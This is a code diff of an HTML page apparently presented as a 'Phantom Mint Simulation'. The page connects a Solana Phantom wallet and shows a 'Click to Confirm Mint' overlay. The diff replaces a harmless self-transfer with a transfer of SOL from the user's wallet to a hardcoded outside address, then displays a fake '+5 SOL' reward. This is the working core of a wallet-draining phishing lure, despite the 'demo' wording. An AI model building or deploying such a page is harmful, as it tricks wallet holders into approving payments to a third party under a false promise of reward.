@@ -2,52 +2,50 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Phantom Mint Overlay</title>
-  <link rel="icon" href="data:;base64,iVBORw0KGgo="> <!-- prevent favicon 404 -->
+  <title>Phantom Mint Simulation</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" href="data:;base64,iVBORw0KGgo=">
   <style>
     body {
-      margin: 0;
-      background-color: #0d0d0d;
+      background: #0b0b0b;
       color: white;
-      font-family: 'Segoe UI', sans-serif;
+      font-family: Arial, sans-serif;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
+      margin: 0;
+    }
+
+    h1 {
+      color: #a78bfa;
     }
 
     button {
       padding: 15px 30px;
-      margin: 20px;
       font-size: 16px;
-      background-color: #8e44ad;
+      background: #7c3aed;
       color: white;
       border: none;
-      border-radius: 10px;
+      border-radius: 12px;
       cursor: pointer;
+      margin-top: 20px;
     }
 
     #overlay {
       display: none;
       position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
+      inset: 0;
       background: rgba(0, 0, 0, 0.85);
-      backdrop-filter: blur(4px);
       z-index: 1000;
+      color: #d8b4fe;
+      font-size: 24px;
+      display: flex;
       justify-content: center;
       align-items: center;
-      color: #ab83f1;
       flex-direction: column;
-      font-size: 24px;
       cursor: pointer;
-    }
-
-    #overlay span {
-      margin-top: 20px;
-      font-size: 14px;
-      opacity: 0.7;
     }
 
     #reward {
@@ -56,11 +54,10 @@
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      background: #1b1b1b;
+      background: #1f1f1f;
       padding: 30px 60px;
       border-radius: 20px;
       font-size: 36px;
-      font-weight: bold;
       color: #00ffcc;
       z-index: 1100;
       box-shadow: 0 0 20px #00ffcc;
@@ -75,12 +72,12 @@
 
   <div id="overlay">
     <div>Click to Confirm Mint</div>
-    <span>Phantom will ask for approval</span>
+    <span style="font-size: 14px; margin-top: 10px;">Phantom will prompt for approval</span>
   </div>
 
   <div id="reward">+5 SOL</div>
 
-  <!-- Solana Web3 IIFE (global) -->
+  <!-- Solana Web3 global -->
   <script src="https://unpkg.com/@solana/web3.js@1.93.1/lib/index.iife.min.js"></script>
 
   <script>
@@ -99,7 +96,7 @@
         connectBtn.innerText = "Connected: " + wallet.toString().slice(0, 6) + "...";
         mintBtn.style.display = "inline-block";
       } catch (err) {
-        alert("Wallet connection failed.");
+        alert("Phantom connection rejected.");
       }
     };
 
@@ -111,28 +108,28 @@
       overlay.style.display = "none";
 
       try {
-        const transaction = new solanaWeb3.Transaction().add(
+        const recipient = new solanaWeb3.PublicKey("2Zy1p8KHnspkYQzvEEZc6SGHQhDAGt9hnPoRAJZCGT6k"); // Dummy address
+        const lamports = 0.001 * solanaWeb3.LAMPORTS_PER_SOL;
+
+        const tx = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
             fromPubkey: wallet,
-            toPubkey: wallet, // dummy transaction to self
-            lamports: 0.00003 * 1e9,
+            toPubkey: recipient,
+            lamports: lamports
           })
         );
 
-        transaction.feePayer = wallet;
+        tx.feePayer = wallet;
         const { blockhash } = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = blockhash;
+        tx.recentBlockhash = blockhash;
 
-        const signed = await window.solana.signAndSendTransaction(transaction);
+        const sig = await window.solana.signAndSendTransaction(tx);
+        console.log("TX signature:", sig);
 
         reward.style.display = "block";
-        setTimeout(() => {
-          reward.style.display = "none";
-        }, 3000);
-
-        console.log("Transaction Signature:", signed.signature);
+        setTimeout(() => reward.style.display = "none", 3000);
       } catch (err) {
-        console.error("Transaction Failed:", err);
+        console.error("Transaction failed or rejected", err);
       }
     };
 
@@ -148,10 +145,9 @@
           }
         }
       } else {
-        alert("Please install Phantom Wallet.");
+        alert("Please install Phantom Wallet to use this demo.");
       }
     });
   </script>
-
 </body>
 </html>
